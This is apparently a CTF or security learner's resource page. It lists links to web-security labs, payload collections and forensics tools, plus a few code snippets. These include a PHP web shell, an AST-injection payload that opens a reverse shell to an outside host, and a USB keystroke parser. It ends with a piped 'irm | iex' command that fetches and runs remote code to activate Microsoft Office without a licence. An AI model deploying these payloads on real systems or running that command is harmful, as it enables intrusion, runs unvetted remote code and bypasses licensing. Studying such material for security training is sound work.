---
title: Source 
published: 2022-07-07
category: Source & Tools
tags: [Source, Tools]
image: "./image/titles/sources.png"
description: Some sources used.
draft: false
---

# Tools

---

## Payloads & Tools &  Note

---
  - Link : [portswigger all labs](https://portswigger.net/web-security/all-labs)

  - Link : [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/)

  - Link : [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

  - Link : [server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)

  - Link : [server-side-template-injection-exploitation](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

  - Link : [server-side-template-injection-exploitation](https://github.com/getgrav/grav/security/advisories/GHSA-whr7-m3f8-mpm8)

  - Link : [CSP check](https://csp-evaluator.withgoogle.com/)

  - Link : [bypass CSP](https://www.jsdelivr.com/github)

  - Link : [PHP Type Juggling](https://viblo.asia/p/php-type-juggling-924lJPYWKPM)

  - Link : [AST injection (Abstract Syntax Tree)](https://hackmd.io/@CP04042K/rkPZgkAes)

  - Link : [CSP nonce](https://content-security-policy.com/nonce/)

**Php Shell**

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

**AST injection**

```shell
{
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
}



Object.prototype.block = {"type": "Text", "line": "console.log(process.mainModule.require('child_process').execSync('whoami').toString())"};
```

**Brainfuck script**

```python
def brainfuck_interpreter(code, input_data=""):
    code_ptr = 0
    mem = [0] * 30000
    mem_ptr = 0
    input_ptr = 0
    output = ""
    loop_stack = []

    while code_ptr < len(code):
        cmd = code[code_ptr]

        if cmd == '>':
            mem_ptr = (mem_ptr + 1) % len(mem)
        elif cmd == '<':
            mem_ptr = (mem_ptr - 1) % len(mem)
        elif cmd == '+':
            mem[mem_ptr] = (mem[mem_ptr] + 1) % 256
        elif cmd == '-':
            mem[mem_ptr] = (mem[mem_ptr] - 1) % 256
        elif cmd == '.':
            output += chr(mem[mem_ptr])
        elif cmd == ',':
            if input_ptr < len(input_data):
                mem[mem_ptr] = ord(input_data[input_ptr])
                input_ptr += 1
            else:
                mem[mem_ptr] = 0
        elif cmd == '[':
            if mem[mem_ptr] == 0:
                loop_level = 1
                while loop_level > 0:
                    code_ptr += 1
                    if code[code_ptr] == '[':
                        loop_level += 1
                    elif code[code_ptr] == ']':
                        loop_level -= 1
            else:
                loop_stack.append(code_ptr)
        elif cmd == ']':
            if mem[mem_ptr] != 0:
                code_ptr = loop_stack[-1]
            else:
                loop_stack.pop()

        code_ptr += 1

    return output

brainfuck_code = "..."
print(brainfuck_interpreter(brainfuck_code))
```

**Keylogger**

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import sys
KEY_CODES = {
    0x04:['a', 'A'],
    0x05:['b', 'B'],
    0x06:['c', 'C'],
    0x07:['d', 'D'],
    0x08:['e', 'E'],
    0x09:['f', 'F'],
    0x0A:['g', 'G'],
    0x0B:['h', 'H'],
    0x0C:['i', 'I'],
    0x0D:['j', 'J'],
    0x0E:['k', 'K'],
    0x0F:['l', 'L'],
    0x10:['m', 'M'],
    0x11:['n', 'N'],
    0x12:['o', 'O'],
    0x13:['p', 'P'],
    0x14:['q', 'Q'],
    0x15:['r', 'R'],
    0x16:['s', 'S'],
    0x17:['t', 'T'],
    0x18:['u', 'U'],
    0x19:['v', 'V'],
    0x1A:['w', 'W'],
    0x1B:['x', 'X'],
    0x1C:['y', 'Y'],
    0x1D:['z', 'Z'],
    0x1E:['1', '!'],
    0x1F:['2', '@'],
    0x20:['3', '#'],
    0x21:['4', '$'],
    0x22:['5', '%'],
    0x23:['6', '^'],
    0x24:['7', '&'],
    0x25:['8', '*'],
    0x26:['9', '('],
    0x27:['0', ')'],
    0x28:['\n','\n'],
    0x29:['[ESC]','[ESC]'],
    0x2a:['[BACKSPACE]', '[BACKSPACE]'],
    0x2C:[' ', ' '],
    0x2D:['-', '_'],
    0x2E:['=', '+'],
    0x2F:['[', '{'],
    0x30:[']', '}'],
    0x32:['#','~'],
    0x33:[';', ':'],
    0x34:['\'', '"'],
    0x36:[',', '<'],
    0x37:['.', '>'],
    0x38:['/', '?'],
    0x39:['[CAPSLOCK]','[CAPSLOCK]'],
    0x2b:['\t','\t'],
    0x4f:[u'→',u'→'],
    0x50:[u'←',u'←'],
    0x51:[u'↓',u'↓'],
    0x52:[u'↑',u'↑']
}


#tshark -r ./usb.pcap -Y 'usb.capdata' -T fields -e usb.capdata > keyboards.txt
def read_use(file):
    with open(file, 'r') as f:
        datas = f.read().split('\n')
    datas = [d.strip() for d in datas if d] 
    cursor_x = 0
    cursor_y = 0
    offset_current_line = 0
    lines = []
    output = ''
    skip_next = False
    lines.append("")
    for data in datas:
        shift = int(data.split(':')[0], 16) # 0x2 is left shift 0x20 is right shift
        key = int(data.split(':')[2], 16)

        if skip_next:
            skip_next = False
            continue
        
        if key == 0 or int(data.split(':')[3], 16) > 0:
            continue
        
        if shift != 0:
            shift=1
            skip_next = True
        key_value = KEY_CODES.get(key, None)
        if key_value is None:
            continue
        if KEY_CODES[key][shift] == u'↑':
            lines[cursor_y] += output
            output = ''
            cursor_y -= 1
        elif KEY_CODES[key][shift] == u'↓':
            lines[cursor_y] += output
            output = ''
            cursor_y += 1
        elif KEY_CODES[key][shift] == u'→':
            cursor_x += 1
        elif KEY_CODES[key][shift] == u'←':
            cursor_x -= 1
        elif KEY_CODES[key][shift] == '\n':
            lines.append("")
            lines[cursor_y] += output
            cursor_x = 0
            cursor_y += 1
            output = ''
        elif KEY_CODES[key][shift] == '[BACKSPACE]':
            output = output[:-1]
            #lines[cursor_y] = output
            cursor_x -= 1
        else:
            output += KEY_CODES[key][shift]
            #lines[cursor_y] = output
            cursor_x += 1
    print(lines)
    if lines == [""]:
        lines[0] = output
    if output != '' and output not in lines:
        lines[cursor_y] += output
    return '\n'.join(lines)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Missing file to read...')
        exit(-1)
    sys.stdout.write(read_use(sys.argv[1]))
```

  - Link : [Thumb db](https://thumbsdb.herokuapp.com/)

  - Link : [Dcode tool](https://www.dcode.fr/)

  - Link : [Signature of file](https://en.wikipedia.org/wiki/List_of_file_signatures)

  - Link : [CyberChef](https://cyberchef.org/)

  - Link : [Volatility](https://github.com/volatilityfoundation/volatility)

  - Link : [Volatility, Volatility3 command](https://blog.onfvp.com/post/volatility-cheatsheet/)

  - Link : [About vol](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet.html#list-processes)

  - Link : [Olevba tools](https://github.com/decalage2/oletools)

  - Link : [Dots](https://github.com/dfd-tud/deda)

  - Link : Audacity

  - Link : FTK Imager

  - Link : Autopsy

  - Link : [Noaa apt image decoder](https://open-weather.community/decode/)

  - Link : [WMI Forensics](https://github.com/davidpany/WMI_Forensics)

  - Link : [Ecoji tool](https://github.com/keith-turner/ecoji)

  - Link : [PowerDecode](https://github.com/Malandrone/PowerDecode)

  - Link : [QR code scan online](https://qrscanner.net/)

  - Link : [Brainfuck](https://www.dcode.fr/jsfuck-language)

  - Link : [Aperisolve](https://aperisolve.fr/)

  - Link : [WinSearchDBAnalyzer](https://moaistory.blogspot.com/2018/10/winsearchdbanalyzer.html)

  - Link : stegsnow

  - Link : [promt injection](https://viblo.asia/p/llm-hacking-prompt-injection-Rk74a1Kv4eO)

  - Link : [PCRT](https://github.com/sherlly/PCRT)

  - Link : [ericzimmerman tool](https://ericzimmerman.github.io/#!index.md)

  - Link : [keylogger wireshark](https://github.com/5h4rrK/CTF-Usb_Keyboard_Parser)

  - Link : [Gif analyzer](https://github.com/dtmsecurity/gift)

  - Link : [bmc-tool](https://github.com/ANSSI-FR/bmc-tools)

  - Link : [photo](https://www.photopea.com/)
---

## Other

---

**Lisence Microsoft Office**

```shell
irm https://get.activated.win | iex
```

  * choice `Yes`

  * choice `2 (Ohook Office)`

  * choice `1`

from [here](https://youtu.be/y7km4uPwOQo?feature=shared)



